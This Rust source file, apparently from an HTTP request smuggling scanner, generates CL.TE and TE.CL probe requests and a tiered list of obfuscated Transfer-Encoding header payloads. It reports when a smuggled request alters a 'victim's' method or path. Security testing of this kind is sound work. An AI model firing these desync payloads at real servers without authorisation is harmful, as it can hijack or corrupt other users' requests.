use crate::structs::{Config, AttackType, Response};
use colored::*;
use std::io::{self, Write};

pub fn generate_requests(t: AttackType, config: &Config) -> String {
    let request = config.print();
    match t {
        AttackType::ClTe => format!("\
{}\
Content-Length: 11\r\n\
Transfer-Encoding: chunked\r\n\
\r\n\
1\r\n\
A\r\n\
0\r\n\
\r\n", request),

        AttackType::ClTeTime => format!("\
{}\
Content-Length: 4\r\n\
Transfer-Encoding: chunked\r\n\
\r\n\
1\r\n\
A\r\n\
0\r\n\
\r\n", request),

        AttackType::TeClTime => format!("\
{}\
Content-Length: 12\r\n\
Transfer-Encoding: chunked\r\n\
\r\n\
1\r\n\
A\r\n\
0\r\n\
\r\n\
A", request),

        AttackType::ClTeMethod => format!("\
{}\
Content-Length: 6\r\n\
Transfer-Encoding: chunked\r\n\
\r\n\
0\r\n\
\r\n\
G", request),

        AttackType::TeClMethod => {
            let payload: String = format!("\
GGET {} HTTP/1.1\r\n\
Host: {}\r\n\
Accept: */*\r\n\
Content-Length: 9\r\n\
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\r\n\
Accept-Encoding: gzip\r\n\
\r\n\
x=", &config.path, &config.host);

            let hex_payload_len = format!("{:x}", payload.len());

            let mut request = config.print();

            request.push_str(&[
                "Content-Length: ", &(hex_payload_len.len()+2).to_string(),
                "\r\nTransfer-Encoding: chunked\r\n\r\n",
                &hex_payload_len,
                "\r\n",
                &payload,
                "\r\n0\r\n\r\n"
            ].concat());
            request
        },

        AttackType::ClTePath => {
            let payload: String = format!("\
0\r\n\
\r\n\
GET /so404mething HTTP/1.1\r\n\
Host: {}\r\n\
Accept: */*\r\n\
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\r\n\
Accept-Encoding: gzip\r\n\
Content-Length: 9\r\n\
\r\n\
x=", &config.host);
            let mut request = config.print();
            request.push_str(&[
                "Content-Length: ", &payload.len().to_string(),
                "\r\nTransfer-Encoding: chunked\r\n\r\n",
                &payload
            ].concat());
            request
        },

        AttackType::TeClPath => {
            let payload: String = format!("\
GET /so404mething HTTP/1.1\r\n\
Host: {}\r\n\
Accept: */*\r\n\
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\r\n\
Accept-Encoding: gzip\r\n\
\r\n\
x=", &config.host);

            let hex_payload_len = format!("{:x}", payload.len());

            let mut request = config.print();

            request.push_str(&[
                "Content-Length: ", &(hex_payload_len.len()+2).to_string(),
                "\r\nTransfer-Encoding: chunked\r\n\r\n",
                &hex_payload_len,
                "\r\n",
                &payload,
                "\r\n0\r\n\r\n"
            ].concat());
            request
        }
    }
}

pub fn color_request(request: &str) -> String {
    //TODO optimize
    request
    .replace("\r\n", &("\\r\\n".blue().to_string()+"NEW_LINE"))
    .replace("\r", &("\\r".yellow()).to_string())
    .replace("\n", &("\\n".yellow()).to_string())
    .replace("\t", &("\\t".yellow()).to_string())
    .replace("\x01", &("\\x01".yellow()).to_string())
    .replace("\x1f", &("\\x1f".yellow()).to_string())
    .replace("NEW_LINE", "\n")
}

pub fn payloads<'a>(config: &'a Config) -> Vec<&'a str> {
    let mut payloads: Vec<&str> = Vec::with_capacity(36);

    payloads.push("Transfer-Encoding: chunked");
    payloads.push("Transfer-Encoding\t: chunked");
    payloads.push("Transfer-Encoding:\tchunked");
    payloads.push("Transfer-Encoding:\nchunked");
    payloads.push("Transfer-Encoding\r:chunked");

    payloads.push("Transfer-Encoding: CHUNKED");

    payloads.push("Some: thing\nTransfer-Encoding: chunked");

    payloads.push("Transfer-Encoding: chunked\t");
    payloads.push("Transfer-Encoding: chun\tked");
    payloads.push("Transfer-Encoding: chun ked");
    payloads.push("Transfer-Encoding: x");

    payloads.push("TRANSFER_ENCODING: chunked");
    payloads.push("Transfer-Encoding: chunked\r\nTransfer-Encoding: something");
    payloads.push(" Transfer-Encoding: chunked");


    if config.amount_of_payloads == "medium" || config.amount_of_payloads == "all" {
        payloads.push("transfer-encoding: chunked");
        payloads.push("TRANSFER-ENCODING: chunked");
        payloads.push("TRANSFER-ENCODING: CHUNKED");

        payloads.push("Some: thing\rTransfer-Encoding: chunked");
        payloads.push("Some: thing\n\rTransfer-Encoding: chunked");

        payloads.push("Transfer-Encoding: chun\nked");
        payloads.push("Transfer-Encoding: a chunked a");
        payloads.push("Transfer-Encoding: identity, chunked");
        payloads.push("Transfer-Encoding: chun\x01ked");
        payloads.push("Transfer-Encoding: chun\x1fked");
        payloads.push("\tTransfer-Encoding: chunked");
    }

    if config.amount_of_payloads == "all" {
        payloads.push("Transfer-Encoding\n:chunked");
        payloads.push("Transfer-Encoding:\rchunked");

        payloads.push("Transfer-Encoding: \x01chunked");
        payloads.push("Transfer-Encoding: \x1fchunked");

        payloads.push("Some: thing\r\rTransfer-Encoding: chunked");
        payloads.push("Some: thing\n\nTransfer-Encoding: chunked");

        payloads.push("Transfer-Encoding: 'chunked'");
        payloads.push("Transfer-Encoding: `chunked`");
        payloads.push("Transfer-Encoding: \"chunked\"");

        payloads.push("Transfer-Encoding: chun\rked");

        payloads.push("Transfer_Encoding: chunked");
    }

    payloads
}

pub fn found(
    t: AttackType,
    first_request: &str,
    second_request: &str,
    first_response: &Response,
    second_response: &Response
) {
    match t {
        AttackType::ClTeTime => writeln!(io::stdout(),
            "\
Possible Cl Te request smuggling vulnerability found
Reason: Time delay with the wrong Content-Length header observed

Request with the wrong Content-Length header({}, {}ms):\n{}

Usual request({}, {}ms):\n{}",
            first_response.code,
            first_response.time,
            color_request(&first_request),
            second_response.code,
            second_response.time,
            color_request(&second_request)
        ).ok(),
        AttackType::TeClTime => writeln!(io::stdout(),
            "\
Possible Te Cl request smuggling vulnerability found
Reason: Time delay with the wrong chunk size observed

Request with the wrong chunk size({}, {}ms):\n{}

Usual request({}, {}ms):\n{}",
            first_response.code,
            first_response.time,
            color_request(&first_request),
            second_response.code,
            second_response.time,
            color_request(&second_request)
        ).ok(),
        AttackType::ClTeMethod => writeln!(io::stdout(),
            "\
Possible Cl Te request smuggling vulnerability found
Reason: It was possible to change victim's request method

Attacker's request:\n{}

Victim's request:\n{}

Victim's response:\n{}
Usual response:\n{}",
            color_request(&first_request),
            color_request(&second_request),
            first_response.print(),
            second_response.print()
        ).ok(),
        AttackType::ClTePath => writeln!(io::stdout(),
            "\
Possible Cl Te request smuggling vulnerability found
Reason: It was possible to change victim's path

Attacker's request:\n{}

Victim's request:\n{}

Victim's response:\n{}
Usual response:\n{}",
            color_request(&first_request),
            color_request(&second_request),
            first_response.print(),
            second_response.print()
        ).ok(),
        AttackType::TeClMethod => writeln!(io::stdout(),
            "\
Possible Te Cl request smuggling vulnerability found
Reason: It was possible to change victim's request method

Attacker's request:\n{}

Victim's request:\n{}

Victim's response:\n{}
Usual response:\n{}",
            color_request(&first_request),
            color_request(&second_request),
            first_response.print(),
            second_response.print()
        ).ok(),
        AttackType::TeClPath => writeln!(io::stdout(),
            "\
Possible Cl Te request smuggling vulnerability found
Reason: It was possible to change victim's path

Attacker's request:\n{}

Victim's request:\n{}

Victim's response:\n{}
Usual response:\n{}",
        color_request(&first_request),
        color_request(&second_request),
        first_response.print(),
        second_response.print()
        ).ok(),
        _ => unreachable!(),
    };
}